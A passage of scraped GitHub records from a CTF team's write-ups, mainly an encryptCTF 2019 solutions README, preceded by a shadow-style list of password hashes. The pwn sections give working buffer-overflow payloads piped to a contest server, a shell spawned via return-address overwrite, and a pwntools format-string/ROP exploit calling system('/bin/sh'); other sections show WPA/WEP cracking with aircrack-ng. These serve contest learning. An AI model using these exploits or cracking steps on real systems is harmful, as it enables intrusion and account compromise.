oxrLet3OW3MfuFPwLwefVxOr62E.wo7szQ6.swTec1edCFiKnPc42XxMRGsrNJn36mkc2dgH/:17930:0:99999:7:::\ns:$6$TXxh4vV5$v1vF49YZQnonSZrKwBWNp7rpxIRoQY/ooEODqjsdwwdoY8sso.y/EOsoC3GFlpCLYnEY./n/1BuNID5njg0CV.:17930:0:99999:7:::\nc:$6$IYxRoIyR$eEmGTNPNd6HPQibc/UBdQ5zgR/dGQ1dtCuSl0lUmvmbrSKbYEf/SEDlX4fgP.JQXlyFqEgu4NOBiu2eozpAM.0:17930:0:99999:7:::\nw:$6$RmCyBroe$EovezmWQJVvQFGd6.ei2.SfzGJG22CsV47tTnyfKx30TbuG1VMgsk0de6NOQ04bKNML9fbuMu0Pw3TMf82zye1:17930:0:99999:7:::\nd:$6$..CK41Sn$36X19X0jrviLxVVk.KtR9zbHMML0mg1XzMNQgP7eOpGMF1JYSbZHAyReDhNVkm1WaNn3lfO2CsAww14fZZads1:17930:0:99999:7:::\nt:$6$zVFV5HoW$q9WyP6/D0kPL.n7s.FvPcOSRfvcUFQu5QMPps6VbQUD5RMozQsP14GtUiOa/H2V2pU6c6OxcgRqruaLejPaES1:17930:0:99999:7:::\nh:$6$S1RnJ8DK$F/FWFf9En/mn6YqZ67/gOnMT0WdSuaEyn2OArTJbG1IGHd0pUs9TiGDE9P.PhRB6XyHUgA5l/LBmBW8PpJg9M.:17930:0:99999:7:::\nm:$6$SqkKQRak$nZHDrq3vdnajdLzotrW3J9kYzUvzPaUrs6NZaKkkcVN0KiCfUhJfgM6WJvZjZR7hBGWkfIwhZymko7wtsq49s1:17930:0:99999:7:::\nk:$6$ZLCr2itT$tZ0.u7TsXPc3nAntIOepETGkhqfVG1IKaiuW0mAH5QROVuc7fonE43qEhUFT2LHMftYDdTQRAMHpRNMM8Yn1c1:17930:0:99999:7:::\ni:$6$ZlWmheB2$DBLJQPLVhhEdA/iATrOYiqFv4i5TcmBUSX6.tZDo63YP4dcdlAuBnFU65xXIRP1tpNsCS7kc6Fu6jPMS2F7aP1:17930:0:99999:7:::\ny:$6$rIoO6U2u$c5usMXbFP9S75qmDyBBWz1QZuyGH0MGq3mXN32kYipoL5XCFEHjmTRVcuZkmed5OzAopV0CgyA49QzILz5Rmq/:17930:0:99999:7:::\nj:$6$Gpavrajq$me1yxZQ0OiJFedrTmxFsyP5zwOePuFJmgujUWun0h5bCOIVeuJuaIUTDHGCYxkT6mw41BTjlx9c3QvdsG8o0o.:17930:0:99999:7:::\nu:$6$0w3EeszD$bUDQorjCKku1sjtCWMQfJ3ZRmsC5N.LN7CQnjvyCbcq5wSD33x2t/TVXA6jnjtajv8nIZc.Aj.oY80lm44Dhy0:17930:0:99999:7:::\nunderscore:$6$RVUCQJFr$fsKkPUT9Pp5QlsZblSLJ4yKkfBxNMWN0TS.q7ticuEr/HQFdEbyiwK5JmaKKS9UDFzUsY6mhe1knnRbwy7K0s/:17930:0:99999:7:::", "timestamp": "2025-10-24T11:39:19.897291"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-03-29-VolgaCTF-Quals/files/trustvm.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-03-29-VolgaCTF-Quals/files/trustvm.txt", "content": "1. copy data into memory\n2. add zero, which is useless\n\n\n0x000: loadconst [0x0] = 0x2 //0\n0x042: loadconst [0x1] = 0x44 //1\n0x084: loadconst [0x2] = 0x86 //0x40\n0x0c6: loadconst [0xd] = 0xc8 //MAGIC\n0x108: [0xa] = [0x0] + [0x0]\n\n0x10a: loadconst [0x9] = 0x10c //0x192\n0x14c: [0xa] < size_0xf ? jmp 0x192\n0x14e: loadconst [0x9] = 0x150 //0x268\n0x190: jmp 0x268\n\n0x192: loadto [0x9] idx [0xa]\n0x194: [0x8] = [0x9] ^ [0xd]\n0x196: loadconst [0x7] = 0x198 //0x4d\n0x1d8: [0x8] = [0x8] ? 0x4d\n0x1da: storefrom [0x8] idx [0xa]\n\n0x1dc: loadconst [0x7] = 0x1de //0x6f\n0x21e: [0xd] = [0xd] ? 0x6f\n0x220: [0xd] = [0xd] ^ [0x9]\n0x222: [0xa] = [0xa] + 0x40\n\n0x224: loadconst [0x9] = 0x226 //0x10a\n0x266: jmp 0x10a\n0x268: store result", "timestamp": "2025-10-24T11:39:20.020060"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-04-02-encryptCTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-04-02-encryptCTF/README.md", "content": "# 2019-04-02-encryptCTF #\n\n[CTFTime link](https://ctftime.org/event/771) | [Website](https://ctf.encryptcvs.cf/)\n\n---\n\n## Challenges ##\n\n### Cryptography ###\n\n - [x] [75 Hard Looks](#75-cryptography--hard-looks)\n - [x] [100 RSA_Baby](#100-cryptography--rsa_baby)\n - [x] [100 Julius,Q2Flc2FyCg==](#100-cryptography--juliusq2flc2fycg)\n - [x] [150 (TopNOTCH)SA](#150-cryptography--topnotchsa)\n - [x] [200 AEeeeeS](#200-cryptography--aeeeees)\n\n### Forensics ###\n\n - [x] [10 Get Schwifty](#10-forensics--get-schwifty)\n - [x] [50 It's a WrEP](#50-forensics--its-a-wrep)\n - [x] [75 Journey to the centre of the file 1](#75-forensics--journey-to-the-centre-of-the-file1)\n - [x] [100 Wi Will H4CK YOU!!](#100-forensics--wi-will-h4ck-you)\n - [x] [150 Journey to the centre of the file 2](#150-forensics--journey-to-the-centre-of-the-file2)\n\n### Misc ###\n\n - [x] [1 sanity check](#1-misc--sanity-check)\n - [x] [50 Way Back](#50-misc--way-back)\n - [ ] [50 crack-jack](#50-misc--crack-jack)\n - [x] [50 ham-me-baby-2](#50-misc--ham-me-baby-2)\n\n### Pwn ###\n\n - [x] [25 pwn0](#25-pwn--pwn0)\n - [x] [50 pwn1](#50-pwn--pwn1)\n - [x] [100 pwn2](#100-pwn--pwn2)\n - [x] [300 pwn3](#300-pwn--pwn3)\n - [x] [300 pwn4](#300-pwn--pwn4)\n\n### Reversing ###\n\n - [x] [75 crackme01](#75-reversing--crackme01)\n - [x] [150 crackme02](#150-reversing--crackme02)\n - [x] [250 crackme03](#250-reversing--crackme03)\n - [x] [500 dontlook at this Challenge](#500-reversing--dontlook-at-this-challenge)\n\n### Steganography ###\n\n - [x] [25 yhpargonagets](#25-steganography--yhpargonagets)\n - [x] [50 Into The Black](#50-steganography--into-the-black)\n - [ ] [100 Stressed out?](#100-steganography--stressed-out)\n\n### Web ###\n\n - [x] [50 Sweeeeeet](#50-web--sweeeeeet)\n - [x] [50 Slash Slash](#50-web--slash-slash)\n - [x] [100 vault](#100-web--vault)\n - [ ] [100 Env](#100-web--env)\n - [x] [150 repeaaaaaat](#150-web--repeaaaaaat)\n\n---\n\n## 75 Cryptography / Hard Looks ##\n\n**Description**\n\n> Does this look hard?\n> \n> CipherText:\n> ```--_--___--_-_-__--_--__--__-_-__--_--___--__--__--_---__--__-___--_---__---__-__--_---__--______--_---__--_-____--_-____--__--__--_-_-__--_-____--_-____--_--___--_---_--___-___--_-_-__--_---__--__--__--_-____--__--__--_-_-__--_-_-_--__--___--__--__--___-__--__--__--_---__--_-_-_--__--___--_-____---_____--__--__--_-____--_-_-__--__-___--_-____--_-____--_-_-_--__--___--__--__--__--__--_-___--__-_-__--__--__--______--_-_-__--_-_-__--_-____--_---__--_-____---_____--__--_--__--___--__-___--___-__--_---_--__-__```\n> \n> ```Author: @mostwanted002```\n\n**No files provided**\n\n**Solution**\n\nWe can replace `-` with `1` and `\\_` with `0`. We can add two `0` characters at the beginning of the text to have a multiple of 8 for easier decoding from binary. This results in:\n\n    656e63727970744354467b5734355f31375f483452445f334e305547483f217d\n\nWhich decodes into:\n\n`encryptCTF{W45_17_H4RD_3N0UGH?!}`\n\n## 100 Cryptography / RSA_Baby ##\n\n**Description**\n\n> RSA is one of the first public-key cryptosystems and is widely used for secure data transmission. In such a cryptosystem, the encryption key is public and it is different from the decryption key which is kept secret.\n> \n> Google up, understand it, and the flag was encrypted with this <span style=\"color:#990000;\">attached Python Script.</span>\n> \n> \n> ```Author: @mostwanted002```\n\n**Files provided**\n\n - [`flag`](files/rsa_baby-flag.enc)\n - [`encrypt`](files/rsa_baby-encrypt.py)\n\n**Solution**\n\nOne of the primes (`q`) is hardcoded and we are given the modulus `n` in the ciphertext. We can recover `p`:\n\n```python\n>>> p = n // q\n>>> p\n13030877962244354814511445069542882449581922607390244121691806992913837762209651753257058518168164120459969457411474677047559297768866334000219225111914353\n```\n\nThen we simply follow the decryption steps:\n\n```python\n>>> import gmpy2\n>>> e = 65537\n>>> phi = (p - 1) * (q - 1)\n>>> d = gmpy2.invert(e, phi)\n>>> c = 0x1899b6cd310966281b1593a420205588f12ab93af850ad7d9d810a502f6fe4ad93a58b5bbb747803ba33ac94cc5f227761e72bdd9857b7b0227f510683596791526b9295b20be39567fc9a556663e3b0e3fcc5b233e78e38a06b29314d897258fbe15b037d8ff25d272822571dd98dfa4ee5d066d707149a313ad0c93e79b4ee\n>>> hex(pow(c, d, n))\n'0x656e63727970744354467b37344b314e475f423442595f53373350537d0a'\n```\n\nWhich decodes to:\n\n`encryptCTF{74K1NG_B4BY_S73PS}`\n\n## 100 Cryptography / Julius,Q2Flc2FyCg== ##\n\n**Description**\n\n> World of Cryptography is like that Unsolved Rubik's Cube, given to a child that has no idea about it. A new combination at every turn.\n> \n> Can you solve this one, with weird name?\n> \n> ciphertext: `fYZ7ipGIjFtsXpNLbHdPbXdaam1PS1c5lQ`\n> \n> ```Author:@mostwanted002```\n\n**No files provided**\n\n**Solution**\n\nWe can use `base64` to decode the ciphertext, but it contains some high (non-ASCII) bytes:\n\n```bash\n$ base64 -D <<<\"fYZ7ipGIjFtsXpNLbHdPbXdaam1PS1c5lQ\" | xxd\n0000000: 7d86 7b8a 9188 8c5b 6c5e 934b 6c77 4f6d  }.{....[l^.KlwOm\n0000010: 775a 6a6d 4f4b 5739                      wZjmOKW9\n```\n\nWe also know that the flag is in the format `encryptCTF{...}`, so the first character (`0x7D`) should actually be `e` (`0x65`). Based on the name of the challenge (`Julius Caesar` -> [Caesar cipher](https://en.wikipedia.org/wiki/Caesar_cipher)), we should shift each byte by the same amount.\n\n```haxe\nclass Solve {\n  public static function main():Void {\n    var dec = haxe.crypto.Base64.decode(\"fYZ7ipGIjFtsXpNLbHdPbXdaam1PS1c5lQ\");\n    Sys.println([ for (i in 0...dec.length) String.fromCharCode(dec.get(i) - (0x7D - 0x65)) ].join(\"\"));\n  }\n}\n```\n\n`encryptCTF{3T_7U_BRU73?!}`\n\n## 150 Cryptography / (TopNOTCH)SA ##\n\n**Description**\n\n> This admin's Obsession with RSA is beyond crazy, it's like he's being guided by some people more supreme, the top Notch of 7 Billion....\n> \n> Anyways, here's the archive, you know the deal. GodSpeed!\n> \n> ```Author:@mostwanted002```\n\n**Files provided**\n\n - [`topNotch`](files/topnotchsa-topnotch.zip)\n\n**Solution**\n\nIn this RSA challenge we are given the public key in a PEM format. We can read it out using `openssl`:\n\n```bash\n$ openssl rsa -pubin -in pubkey.pem -text -noout\nPublic-Key: (255 bit)\nModulus:\n    7f:fd:2b:1a:a7:27:47:f6:a0:1b:9f:96:77:78:7b:\n    a1:72:90:93:3e:3a:46:64:0c:ee:55:38:34:32:09:\n    ab:d1\nExponent: 65537 (0x10001)\n```\n\nThe we can use e.g. [`yafu`](https://sourceforge.net/projects/yafu/) to factor this key, since it is quite small.\n\n```bash\n$ yafu\n...\nfactor(0x7ffd2b1aa72747f6a01b9f9677787ba17290933e3a46640cee5538343209abd1)\n...\n```\n\nWhich gives us:\n\n    n = 0x7ffd2b1aa72747f6a01b9f9677787ba17290933e3a46640cee5538343209abd1\n    p = 298348117320990514224871985940356407403\n    q = 194038568404418855662295887732506969011\n\nThen we simply follow the decryption steps as [before](#100-cryptography--rsa_baby) to obtain:\n\n`encryptCTF{1%_0F_1%}`\n\n## 200 Cryptography / AEeeeeS ##\n\n**Description**\n\n> ... he encrypted the flag Using AES ECB.\n> \n> the key he gave, is below.\n> \n> Is he mad?\n> \n> <span style=\"color:#990000;\">\n> ```ciphertext:\n> c68145ccbc1bd6228da45a574ad9e29a77ca32376bc1f2a1e4cd66c640450d77```</span>\n> \n> ```Author: @mostwanted002```\n\n**Files provided**\n\n - [`AEeeeeS`](files/aeeeees-aeeeees.key)\n\n**Solution**\n\nThe `key` file actually contains a binary string, which we can decode:\n\n```python\n>>> binary = 0b110100001010100111001101110001011101000010100000110001001101100010100101100010011110010111010001100101011010110110010101111001\n>>> key = binary.to_bytes(16, byteorder=\"big\")\n>>> key\nb'4*sqt(16)bytekey'\n```\n\nThen we just AES decrypt, e.g. using PyCrypto:\n\n```python\n>>> import Crypto.Cipher.AES\n>>> aes = Crypto.Cipher.AES.new(key, Crypto.Cipher.AES.MODE_ECB)\n>>> cipher = 0xc68145ccbc1bd6228da45a574ad9e29a77ca32376bc1f2a1e4cd66c640450d77.to_bytes(32, 'big')\n>>> aes.decrypt(cipher)\n```\n\n`encryptCTF{3Y3S_4R3_0N_A3S_3CB!}`\n\n## 10 Forensics / Get Schwifty ##\n\n**Description**\n\n> <p> Evil Morty, the first democratically-elected President of the Citadel of Ricks, has killed off twenty-seven known Ricks from various dimensions, as well as capturing, torturing, and enslaving hundreds of Mortys. As a fellow Rick-less Morty, Investigator Rick gives you a file revealing Evil Morty's past and true nature. However he cannot seem to access it. Can you help recover it to stop Evil Morty ? </p>\n> \n> <a target=\"_blank\" href=\"https://imgur.com/aMjDe5C\">meme</a><br>\n> <strong>Download file here:</strong> <a target=\"_blank\" href=\"https://drive.google.com/open?id=1XxqRFFpn9Zj7gNQ6Ahg74rTAFPbkeNq9\">link</a><br>\n> <span style=\"color:#e83e8c;\">Author: maskofmydisguise</span>\n\n**Files provided**\n\n- [GetSchwifty.img](files/GetSchwifty.7z)\n\n**Solution**\n\nWe are provided with a disk image, when opened is empty. In order to recover the files we can use foremost\n\n```bash\n$ foremost GetSchwifty.img\n```\n\nThis creates a folder named output which will contain the files that foremost could recover. One of the png has the flag.\n\n**Alternative Solution** by ([ellamaark](https://github.com/ellamaark))\n\nInstead of using foremost, one can use `binwalk` to extract files (using the `--dd` flag).\n\n```bash\n$ binwalk --dd='.*' GetSchwifty.img\n```\n\nThis creates a folder `_GetSchwifty.img.extracted` with all the files, it could extract and outputs to the terminal the file and it's type which we can use to find the png that has the flag.\n\n\n`encryptCTF{alw4ys_d3lete_y0ur_f1les_c0mpletely}`\n\n\n## 50 Forensics / It's a WrEP ##\n\n**Description**\n\n> Sniffed and Spoofed, but director called cut before final scene.\n> Could you help Mr. Alderson to invade into eCorp?\n> \n> Get the password for our Wifi Network \"encryptCTF\"\n> \n> Submit flag as <span style=\"color:#990000;\">encryptCTF{</password/>}</span>\n> \n> <a href=\"https://drive.google.com/open?id=1uh8mSyBP17O6jxLoy1_v01s9yiRYa8sb\">captured.cap</a>\n> \n> \n> ```Author:@mostwanted002```\n\n**Files provided**\n\n- [encryptCTFWEP.cap](files/encryptCTFWEP.cap)\n\n**Solution**\n\nFrom the name of the challenge and description, we are trying to recover the password of a wifi network that is using WEP protocol.\n\nUsing the tool `aircrack-ng`, we can retrieve the password\n\n```bash\naircrack-ng -a 1 encryptCTFWEP.cap\n```\n\nThe -a 1 forces aircrack-ng's attack mode to WEP.\n\n![](screens/aircrack-ng-1.png)\n\nAfter running this command, it list's out the available networks in the pcap file and asks to pick one. After picking the network with the name `encryptCTF`,\naircrack tries to find the password.\n\n![](screens/aircrack-ng-2.png)\n\nIt outputs the password `W45_17_R34L?!`\n\n`encryptCTF{ W45_17_R34L?!}`\n\n\n\n## 75 Forensics / Journey to the centre of the file 1 ##\n\n**Description**\n\n> \"Nearly everything is really interesting if you go into it deeply enough …\" - Richard Feynman\n> \n> > ```  Author: maskofmydisguise ```\n\n**Files provided**\n\n - [`ziptunnel1`](files/journeytothecentreofthefile1-ziptunnel1.gz)\n\n**Solution**\n\nUnzip ad nauseam.\n\n`encryptCTF{w422up_b14tch3s}`\n\n## 100 Forensics / Wi Will H4CK YOU!! ##\n\n**Description**\n\n> Wifi Security Standards have been increased a lot in recent times.\n> \n> But are they secure enough???\n> Get the password for our Wifi Network \"encryptCTF\"\n> \n> Submit flag as <span style=\"color:#990000;\">encryptCTF{</password/>}</span>\n> <a href=\"https://drive.google.com/open?id=1IqDZec42qoeTxgltKwie_8XszPX3OGBu\">captured.cap</a>\n> \n> ```Author:@mostwanted002```\n> \n\n**Files provided**\n\n - [encryptCTFWPA.cap](files/encryptCTFWPA.cap)\n\n**Solution**\n\nThis challenge is similar to [It's a WrEP](#50-forensics--its-a-wrep) challenge. The only difference is that it is using the WPA protocol instead of the WEP protocol. \n\nUsing `aircrack-ng` again and waiting for a long time, give us the password.\n\n```bash\n$ aircrack-ng -a 2 -w rockyou.txt encryptCTFWPA.cap\n```\nWe pass in a wordlist (rockyou.txt in this case) and picking the network to crack and waiting for quite some time, it outputs the password `ThanckYou`.\n\n\n`encryptCTF{ThanckYou}`\n\n\n## 150 Forensics / Journey to the centre of the file 2 ##\n\n**Description**\n\n> [_Improvise. Adapt. Overcome_](https://imgur.com/gallery/wMbXB \"Improvise. Adapt. Overcome\" )\n> \n> > ```  Author: maskofmydisguise ```\n\n**Files provided**\n\n - [`ziptunnel2`](files/journeytothecentreofthefile2-ziptunnel2)\n\n**Solution**\n\nUnzip ad nauseam #2: electric boogaloo.\n\n**Note:** these challenges are trivial e.g. on OS X where any archive file can be double-clicked to unzip. This challenge has a file wrapped in many layers of differing archive / compression methods.\n\n`encryptCTF{f33ls_g00d_d0nt_it?}`\n\n## 1 Misc / sanity check ##\n\n**Description**\n\n> \n\n**No files provided**\n\n**Solution**\n\nThe rules page contains the flag.\n\n`encryptCTF{L3t5_H4CK}`\n\n## 50 Misc / Way Back ##\n\n**Description**\n\n> `put the message in encryptCTF{}`\n\n**Files provided**\n\n - `ENCRYPT` (file unavailable ...)\n\n**Solution**\n\nThe file given showed a classic punched card (similar to e.g. [this one](https://commons.wikimedia.org/wiki/File:Used_Punchcard_(5151286161).jpg)). Using the decoding scheme on [the Wikipedia page](https://en.wikipedia.org/wiki/Punched_card):\n\n         ______________________________________________\n        /&-0123456789ABCDEFGHIJKLMNOPQR/STUVWXYZ\n    12|  x           xxxxxxxxx\n    11|   x                   xxxxxxxxx\n     0|    x                           xxxxxxxxx\n     1|     x        x        x        x\n     2|      x        x        x        x\n     3|       x        x        x        x\n     4|        x        x        x        x\n     5|         x        x        x        x\n     6|          x        x        x        x\n     7|           x        x        x        x\n     8|            x        x        x        x\n     9|             x        x        x        x\n      |________________________________________________\n\nWe obtained the flag (more or less like):\n\n`encryptCTF{B4TCH_PR0C355_571_N0T_50_G00D}`\n\n## 50 Misc / crack-jack ##\n\n**Description**\n\n> Visuals are Deceptive\n> \n> ```author: codacker```\n\n**Files provided**\n\n - [`flag`](files/crackjack-flag.png)\n\n## 50 Misc / ham-me-baby-2 ##\n\n**Description**\n\n> ham-me-baby is back and finally its fixed\n> \n> server follows even parity\n> sorry for inconvenience\n> \n> <span style=\"color:#990000;\">```nc 104.154.106.182 6969```</span>\n\n**No files provided**\n\n**Solution**\n\nThis is simply a programming challenge to implement the [Hamming(7,4)](https://en.wikipedia.org/wiki/Hamming(7,4)) error-correcting code.\n\n[Full script here](scripts/Codes.hx)\n\n```\n$ haxe --run Codes\n                        Welcome To \n\n     ____                       __    _______________  \n    / __/__  __________ _____  / /_  / ___/_  __/ __/  \n   / _// _ \\/ __/ __/ // / _ \\/ __/ / /__  / / / _/    \n  /___/_//_/\\__/_/  \\_, / .__/\\__/  \\___/ /_/ /_/      \n                ___/___/_/_____                        \n               |_  |/ _ <  / _ \\                       \n              / __// // / /\\_, /                       \n             /____/\\___/_//___/                        \n                                                         \n\nyou will be receiving hamming(7,4) codes. your job is to send data bits\nfrom a 7 bit hamming code. \n ___________________________________________________________________\n|                                                                   |\n|   DO YOUR RESEARCH : https://en.wikipedia.org/wiki/Hamming(7,4)   |\n|  FLAG WILL BE PRINTED AFTER YOU SEND CORRECT DATA BITS 100 TIMES  |\n|___________________________________________________________________|\n\n               the order of the bits followed is\n\n                    P1 P2 D3 P4 D5 D6 D7\n\n\nand come back here. remember somebits could be flipped. you need to send\ncorrect data bits.\n\n[*] CODE: 1011010\n[*] DATA: CODE VALIDATED\n[*] CODE: 1010101\n[*] DATA: CODE VALIDATED\n...\n[*] CODE: 1010000\n[*] DATA: CODE VALIDATED\n[*] CODE: 1110010\n[*] DATA: CODE VALIDATED\nhere's your flag: encryptCTF{1t_w4s_h4rd3r_th4n_1_th0ught}\n```\n\n`encryptCTF{1t_w4s_h4rd3r_th4n_1_th0ught}`\n\n## 25 Pwn / pwn0 ##\n\n**Description**\n\n> How's the josh?\n> \n> <span style=\"color:#990000;\">```nc 104.154.106.182 1234```</span>\n> \n> author: codacker\n\n**Files provided**\n\n - [`pwn0`](files/pwn0-pwn0)\n\n**Solution**\n\nAfter decompilation:\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char input[64]; // [esp+1Ch] [ebp-44h]\n  char check[4]; // [esp+5Ch] [ebp-4h]\n\n  setvbuf(stdout, 0, 2, 0);\n  puts(\"How's the josh?\");\n  gets(input);\n  if ( !memcmp(check, \"H!gh\", 4u) )\n  {\n    puts(\"Good! here's the flag\");\n    print_flag();\n  }\n  else\n  {\n    puts(\"Your josh is low!\\nBye!\");\n  }\n  return 0;\n}\n```\n\n`gets` is used here on user input, which means we have a buffer overflow vulnerability, and we can override the value in `check`.\n\n```bash\n$ printf \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaH\\x21gh\\n\" | nc 104.154.106.182 1234\nHow's the josh?\nGood! here's the flag\n```\n\n(note `\\x21` to escape a `!` which is special in `bash`)\n\n`encryptCTF{L3t5_R4!53_7h3_J05H}`\n\n## 50 Pwn / pwn1 ##\n\n**Description**\n\n> Let's do some real stack buffer overflow\n> \n> <span style=\"color:#990000;\">```nc 104.154.106.182 2345```</span>\n> \n> author: codacker\n\n**Files provided**\n\n - [`pwn1`](files/pwn1-pwn1)\n\n**Solution**\n\nAfter decompilation:\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char s[128]; // [esp+10h] [ebp-80h]\n\n  setvbuf(stdout, 0, 2, 0);\n  printf(\"Tell me your name: \");\n  gets(s);\n  printf(\"Hello, %s\\n\", s);\n  return 0;\n}\n```\n\nThere is also a `shell` function loaded at address `0x080484AD`:\n\n```c\nint shell()\n{\n  return system(\"/bin/bash\");\n}\n```\n\nWe overflow the `s` buffer and a bit more to replace the return pointer with the address of `shell`.\n\n```bash\n$ (printf \"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\\xAD\\x84\\x04\\x08\\n\"; cat -) | nc 104.154.106.182 2345\nTell me your name: Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa??\nwhoami\npwn1\nls\nflag.txt\npwn1\ncat flag.txt\n```\n\n`encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}`\n\n## 100 Pwn / pwn2 ##\n\n**Description**\n\n> I made a simple shell which allows me to run some specific commands on my server can you test it for bugs?\n> \n> <span style=\"color:#990000;\">```nc 104.154.106.182 3456```</span>\n> \n> author: codacker\n\n**Files provided**\n\n - [`pwn2`](files/pwn2-pwn2)\n\n**Solution**\n\nRewrite the return address to `jmp esp`, so we can execute our shellcode on the stack just after the return address.\n\n## 300 Pwn / pwn3 ##\n\n**Description**\n\n> libc is such a nice place to hangout, isn't it?\n> \n> <span style=\"color:#990000;\">```nc 104.154.106.182 4567```</span>\n> \n> author: codacker\n\n**Files provided**\n\n - [`pwn3`](files/pwn3-pwn3)\n\n**Solution**\n\nROP to call `puts(&puts@got)` and `pop xxx; ret` to leak address in GOT table and return to main for second exploitation.\nWe can find that the `libc` being used is `2.19` by searching low 12 bits of remote `puts` function address being leaked in `libc-database`.\nThen call `System(\"/bin/sh\")` to get shell.\n\n## 300 Pwn / pwn4 ##\n\n**Description**\n\n> GOT is a amazing series!\n> \n> <span style=\"color:#990000;\">```nc 104.154.106.182 5678```</span>\n> \n> author: codacker\n\n**Files provided**\n\n - [`pwn4`](files/pwn4-pwn4)\n\n**Solution**\n\nAlmost same as `pwn3` except it has a canary protection and a format string vulnerability. Use that format string to rewrite GOT table entry of `__stack_chk_fail` to any address pointing to a `retn` instruction so it will not abort but will return immediately when being called.\n```python\nfrom pwn import *\nimport struct\ng_local=1\ncontext.log_level='debug'\nif g_local:\n\tsh = process('./pwn2')\n\tgdb.attach(sh)\nelse:\n\te = ELF(\"libc-2.19.so\")\n\tsh = remote(\"104.154.106.182\", 3456)\n\ndef hn(pos, val):\n\tassert val < 0x10000\n\tif val == 0:\n\t\treturn \"%\" + str(pos) + \"$hn\"\n\telse:\n\t\treturn \"%\" + str(val) + \"c%\" + str(pos) + \"$hn\"\n\ndef cont_shoot(poses, vals):\n\tassert len(poses) == len(vals)\n\tsize = len(poses)\n\tret = \"\"\n\ti = 0\n\tcur_size = 0\n\tnext_overflow = 0\n\twhile i < size:\n\t\tassert next_overflow >= cur_size\n\t\tnum = next_overflow - cur_size + vals[i]\n\t\tif num < 0x10000:\n\t\t\tret += hn(poses[i], num)\n\t\t\tnext_overflow += 0x10000\n\t\telse:\n\t\t\tnum = vals[i] - (cur_size - (next_overflow - 0x10000))\n\t\t\tassert num >= 0\n\t\t\tret += hn(poses[i], num)\n\t\tcur_size += num\n\t\ti += 1\n\treturn ret\n\nsh.recvuntil(\" the new?\\n\")\nsh.sendline((cont_shoot([15], [0x85E4]).ljust(0x20, '\\x00') + p32(0x8049904)).ljust(0x90, 'A') \\\n + p32(0x80483F0) + p32(0x080483a1) + p32(0x8049908) + p32(0x8048551))\nleak = sh.recvuntil('\\n')\nlibc_addr = u32(leak[:4]) - e.symbols[\"puts\"] #0x5fca0\nprint hex(libc_addr)\n\nsh.recvuntil(\" the new?\\n\")\nsh.sendline('A' * 0x90 + p32(libc_addr + e.symbols[\"system\"]) + p32(0) + \\\n\tp32(libc_addr + next(e.search(\"/bin/sh\\x00\"))))\n\nsh.interactive()\n```\n\n## 75 Reversing / crackme01 ##\n\n**Description**\n\n> this is crackme01.\n> \n> crackme01 is a crackme.\n> \n> so crackme!\n> \n> Author: @X3eRo0\n\n**Files provided**\n\n - [`crackme01`](files/crackme01-crackme01)\n\n**Solution**\n\nWe can decompile the `main` method in IDA to get:\n\n```c\n__int64 __fastcall main(__int64 argc, char **argv, char **envp)\n{\n  char input[20]; // [rsp+10h] [rbp-20h]\n  unsigned __int64 v5; // [rsp+28h] [rbp-8h]\n\n  v5 = __readfsqword(0x28u);\n  printf(\"Enter The Secret Code To Open the Vault: \", argv, envp, argv);\n  fgets(input, 20, stdin);\n  printf(\"\\nFlag: \", 20LL);\n  if ( input[1] == 'D' )\n  {\n    printf(\"en\");\n    if ( input[2] == 'D' )\n    {\n      printf(\"cryptCTF{BYE}\");\n      exit(0);\n    }\n    if ( input[2] == 1 )\n    {\n      printf(\"cry\");\n      if ( input[3] != 'A' )\n        exit(0);\n      printf(\"ptC\");\n      if ( input[5] != ' ' )\n        exit(0);\n      printf(\"TF{\");\n      if ( input[6] != '!' )\n        exit(0);\n      printf(\"gdb\");\n      if ( input[8] != 'e' )\n        exit(0);\n      printf(\"_or\");\n      if ( input[9] != '\\x19' )\n        exit(0);\n      printf(\"_r2?\");\n      if ( input[10] != '\\t' )\n        exit(0);\n      puts(\"}\");\n    }\n  }\n  return 0LL;\n}\n```\n\nA password is read (could be brute-forced one character at a time if needed) from `stdin`. We can simply put the individual bits of the output together to assemble the flag:\n\n`encryptCTF{gdb_or_r2?}`\n\n## 150 Reversing / crackme02 ##\n\n**Description**\n\n> quack me!\n> \n> ```author: Robyn12```\n\n**Files provided**\n\n - [`crackme02`](files/crackme02-crackme02)\n\n**Solution**\n\nWe decompile the binary with IDA again. `main` asks for a password, but then calls `sub_73A` to actually print the flag. We can decompile that function:\n\n```c\n__int64 __fastcall printFlag(int key)\n{\n  signed int i; // [rsp+1Ch] [rbp-34h]\n  char encFlag[40]; // [rsp+20h] [rbp-30h]\n  unsigned __int64 v4; // [rsp+48h] [rbp-8h]\n\n  v4 = __readfsqword(0x28u);\n  *(_QWORD *)encFlag = 0x2E191D141F0E0308LL;\n  *(_QWORD *)&encFlag[8] = 0x1F020A012C162B39LL;\n  *(_QWORD *)&encFlag[16] = 0x203401E00051904LL;\n  *(_DWORD *)&encFlag[24] = 0xC084019;\n  *(_WORD *)&encFlag[28] = 0x141E;\n  encFlag[30] = 0x10;\n  for ( i = 0; i <= 30; ++i )\n    putchar(key ^ encFlag[i]);\n  return 0LL;\n}\n```\n\nThe important thing to note is that this function takes a single argument and it actually has to be in the range `[0, 255]` for `putchar` to print out valid bytes. We could brute force this easily.\n\nHowever, we know the flag starts with `e` (`0x65`), and the encoded flag starts with `0x08`. Hence the key is `0x65 ^ 0x08 = 0x6D`.\n\n    0x2E191D141F0E0308\n    0x1F020A012C162B39\n    0x0203401E00051904\n    0x0C084019\n    0x141E\n    0x10\n    -> (little endian to big endian)\n    0x08030E1F141D192E\n    